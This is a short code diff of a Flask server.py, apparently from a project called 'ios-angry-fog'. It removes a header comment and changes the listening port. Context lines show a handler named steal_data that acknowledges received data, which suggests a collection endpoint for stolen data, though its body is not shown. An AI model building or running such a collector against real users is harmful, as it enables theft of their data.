@@ -1,9 +1,5 @@
 #
-//  server.py
-//  ios-angry-fog
-//
-//  Created by Mariia Glushenkova on 28.4.2025.
-//
+
 
 from flask import Flask, request
 
@@ -19,4 +15,4 @@ def steal_data():
     return {"status": "received"}, 200
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=5001)
